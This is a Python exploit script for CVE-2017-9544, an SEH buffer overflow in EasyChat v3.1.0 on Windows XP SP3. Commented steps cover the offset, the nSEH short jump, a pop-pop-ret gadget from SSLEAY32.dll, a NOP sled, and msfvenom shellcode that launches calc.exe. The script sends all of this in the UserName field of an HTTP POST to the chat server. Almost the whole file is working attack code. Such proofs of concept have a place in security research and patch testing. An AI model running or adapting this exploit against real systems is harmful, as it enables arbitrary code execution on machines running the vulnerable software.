#!/usr/bin/python

# Title: EasyChat v3.1.0 - CVE-2017-9544 
# Target binary: EasyChat.exe
# Target system: Windows XP SP3

#-----------------------------------------------------------------------------------------------------------#
# 1) reaching the seh chain after 217 bytes;
# 2) overwriting the nSEH with 0x909022eb --> 16-byte short jump forward <--
# 3) overwriting the SEH handler with a pop,pop,ret instruction --> 0x100180e7 pop esi, pop edi, ret (SSLEAY32.dll)<--
# 3) adding 50 nops for padding;
# 5) adding shellcode.
#-----------------------------------------------------------------------------------------------------------#

import socket
import sys


shellcode = "\xdb\xc7\xbe\x9b\xbd\xba\x59\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
shellcode += "\x31\x83\xea\xfc\x31\x72\x14\x03\x72\x8f\x5f\x4f\xa5\x47\x1d"
shellcode += "\xb0\x56\x97\x42\x38\xb3\xa6\x42\x5e\xb7\x98\x72\x14\x95\x14"
shellcode += "\xf8\x78\x0e\xaf\x8c\x54\x21\x18\x3a\x83\x0c\x99\x17\xf7\x0f"
shellcode += "\x19\x6a\x24\xf0\x20\xa5\x39\xf1\x65\xd8\xb0\xa3\x3e\x96\x67"
shellcode += "\x54\x4b\xe2\xbb\xdf\x07\xe2\xbb\x3c\xdf\x05\xed\x92\x54\x5c"
shellcode += "\x2d\x14\xb9\xd4\x64\x0e\xde\xd1\x3f\xa5\x14\xad\xc1\x6f\x65"
shellcode += "\x4e\x6d\x4e\x4a\xbd\x6f\x96\x6c\x5e\x1a\xee\x8f\xe3\x1d\x35"
shellcode += "\xf2\x3f\xab\xae\x54\xcb\x0b\x0b\x65\x18\xcd\xd8\x69\xd5\x99"
shellcode += "\x87\x6d\xe8\x4e\xbc\x89\x61\x71\x13\x18\x31\x56\xb7\x41\xe1"
shellcode += "\xf7\xee\x2f\x44\x07\xf0\x90\x39\xad\x7a\x3c\x2d\xdc\x20\x2a"
shellcode += "\xb0\x52\x5f\x18\xb2\x6c\x60\x0c\xdb\x5d\xeb\xc3\x9c\x61\x3e"
shellcode += "\xa0\x53\x28\x63\x80\xfb\xf5\xf1\x91\x61\x06\x2c\xd5\x9f\x85"
shellcode += "\xc5\xa5\x5b\x95\xaf\xa0\x20\x11\x43\xd8\x39\xf4\x63\x4f\x39"
shellcode += "\xdd\x07\x0e\xa9\xbd\xe9\xb5\x49\x27\xf6"
# msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x0d\x25\2b" -f c
# badchars: \x00\x0a\x0d\x25\2b


payload = b"A"*217
payload += "\xeb\x22\x90\x90"   # jmp short +16 bytes
payload += "\xe7\x80\x01\x10"   # 0x100180e7 - pop,pop,ret (SSLEAY32.dll)
payload += "\x90"*50
payload += shellcode

request = "POST /registresult.htm HTTP/1.1\r\n\r\n"
request += "Host: 127.0.0.1"
request += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
request += "Accept-Language: en-US,en;q=0.5"
request += "Accept-Encoding: gzip, deflate"
request += "Referer: http://192.168.1.11/register.ghp"
request += "Connection: close"
request += "Content-Type: application/x-www-form-urlencoded"

request += "UserName=" + payload +"&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register"

try:
    socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    socket.connect(("127.0.0.1" , 80))
    socket.send(request)
    socket.close()
except:
    print "[-] Error connecting to the target. Exiting..."
    sys.exit()
